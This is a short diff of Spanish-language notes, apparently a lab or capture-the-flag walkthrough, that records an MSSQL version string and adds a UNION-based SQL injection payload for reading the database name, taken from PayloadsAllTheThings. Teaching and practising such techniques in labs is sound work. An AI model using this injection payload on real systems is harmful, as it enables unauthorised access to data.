@@ -127,9 +127,16 @@ Pudiendo sacar la versión del servicio MSSQL
 ```
 
 ```ad-info
-##### Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
+Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
 ```
 
+
+Ayudándonos de payloads all the things podemos identificar el nombre de la base de datos que se esta usando
+```sql
+'union select 1,(SELECT DB_NAME()),3,4,5,6--
+```
+
+A continuacion buscaremos como listar las tablas
 
 
 
